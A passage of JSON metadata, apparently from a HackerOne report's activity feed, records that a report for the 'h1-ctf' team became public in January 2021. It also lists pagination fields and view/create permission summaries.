ivities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-01-11T21:32:20.574Z","updated_at":"2021-01-11T21:32:20.574Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}